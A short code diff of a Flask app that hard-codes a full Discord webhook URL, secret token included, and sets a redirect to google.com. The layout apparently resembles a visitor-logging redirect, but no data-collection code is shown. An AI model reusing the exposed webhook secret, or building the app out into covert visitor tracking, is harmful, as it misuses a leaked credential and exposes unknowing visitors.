@@ -4,7 +4,7 @@ import os
 
 app = Flask(__name__)
 
-WEBHOOK_URL = os.getenv("https://discordapp.com/api/webhooks/1499147387527237784/--MmQlV9AAbfPsoBO2GJcOxrRVZ3zR0UdonTznFov6j1rMQM-VwQRtmZzjgn29iUMj_n")
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1499147387527237784/--MmQlV9AAbfPsoBO2GJcOxrRVZ3zR0UdonTznFov6j1rMQM-VwQRtmZzjgn29iUMj_n"
 REDIRECT_URL = "https://google.com"
 
 @app.route("/")
